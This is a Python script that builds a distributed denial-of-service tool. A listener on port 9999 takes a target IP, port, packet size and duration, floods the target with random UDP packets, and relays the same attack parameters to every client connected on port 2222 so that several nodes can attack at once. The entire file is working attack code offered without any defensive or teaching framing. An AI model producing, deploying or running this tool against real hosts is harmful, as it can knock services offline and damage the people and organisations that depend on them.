import socket
import random
import time
import threading

# Server listening ports
MAIN_SERVER_PORT = 9999  # The port where the main server listens for the attack parameters
RELAY_SERVER_PORT = 2222  # The port where the relay server listens for forwarding the attack parameters

connected_clients = []  # List to keep track of connected clients on port 2222

def udp_flood(ip, port, size, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(int(size))

    timeout = time.time() + int(duration)
    sent_packets = 0

    print(f"Starting UDP flood on {ip}:{port} with {size}-byte packets for {duration} seconds.")
    
    while True:
        if time.time() > timeout:
            break
        sock.sendto(bytes_to_send, (ip, int(port)))
        sent_packets += 1

    print(f"Attack finished. Sent {sent_packets} packets.")

def handle_main_client(client_socket):
    # Receive the attack parameters from the client
    try:
        data = client_socket.recv(1024).decode()
        ip, port, size, duration = data.split(',')

        # Execute the attack
        udp_flood(ip, port, size, duration)

        # Relay the attack parameters to all connected clients on port 2222
        relay_to_connected_clients(data)
    finally:
        client_socket.close()

def handle_relay_client(client_socket):
    # Add the client to the list of connected clients
    connected_clients.append(client_socket)
    print(f"New client connected on port {RELAY_SERVER_PORT}. Total connected: {len(connected_clients)}")

    # Keep the connection open
    try:
        while True:
            pass  # Keep the connection alive
    except Exception as e:
        print(f"Client on port {RELAY_SERVER_PORT} disconnected: {e}")
    finally:
        connected_clients.remove(client_socket)
        client_socket.close()

def relay_to_connected_clients(data):
    # Send the received attack parameters to all clients connected on port 2222
    print(f"Relaying attack parameters to {len(connected_clients)} clients on port {RELAY_SERVER_PORT}.")
    for client in connected_clients:
        try:
            client.sendall(data.encode())
        except Exception as e:
            print(f"Failed to send data to a client: {e}")
            connected_clients.remove(client)

def start_main_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', MAIN_SERVER_PORT))
    server_socket.listen(5)

    print(f"Main server listening on port {MAIN_SERVER_PORT}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Accepted connection from {addr} on port {MAIN_SERVER_PORT}")

        # Handle the client in a new thread
        client_handler = threading.Thread(target=handle_main_client, args=(client_socket,))
        client_handler.start()

def start_relay_server():
    relay_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    relay_socket.bind(('0.0.0.0', RELAY_SERVER_PORT))
    relay_socket.listen(5)

    print(f"Relay server listening on port {RELAY_SERVER_PORT}...")

    while True:
        client_socket, addr = relay_socket.accept()
        print(f"Accepted connection from {addr} on port {RELAY_SERVER_PORT}")

        # Handle the relay client in a new thread
        relay_handler = threading.Thread(target=handle_relay_client, args=(client_socket,))
        relay_handler.start()

if __name__ == "__main__":
    # Start both the main server and the relay server in separate threads
    threading.Thread(target=start_main_server).start()
    threading.Thread(target=start_relay_server).start()

